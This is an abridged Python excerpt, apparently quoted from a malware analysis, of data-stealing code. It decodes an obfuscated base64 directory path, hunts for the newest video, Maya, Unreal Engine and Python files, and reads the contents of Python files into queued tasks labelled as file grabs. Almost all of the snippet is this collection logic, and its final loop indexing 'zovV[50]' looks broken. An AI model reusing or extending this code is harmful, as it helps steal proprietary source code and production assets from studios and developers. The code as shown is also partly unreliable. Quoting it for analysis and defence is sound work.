...
try:
    ...
    ldir += search_latest_files_or_dirs(
        dir_path=b64decode_padded("UzovdGVtcC9NT0Qv"), ext="", n=10
    )
    ldir += [
...
try:
    ...
    zovV = []
    for _, dp in ldir:
        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".mp4", n=8)
        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".mov", n=8)
        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".pyc", n=8)
        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".pyo", n=8)
        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".py", n=8)
        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".ma", n=8)
        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".uasset", n=8)
        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".uproject", n=8)
    ...
    for _, fp in zovV[50]:
        ...
        try:
            if fp.endswith(".py"):
                with open(fp) as fop:
                    add_queue_task(
                        f"tsl_scp_get__{os.path.basename(fp)[:7]}",
                        {"path": fp, "read": fop.read()},
                    )
        except:
            pass
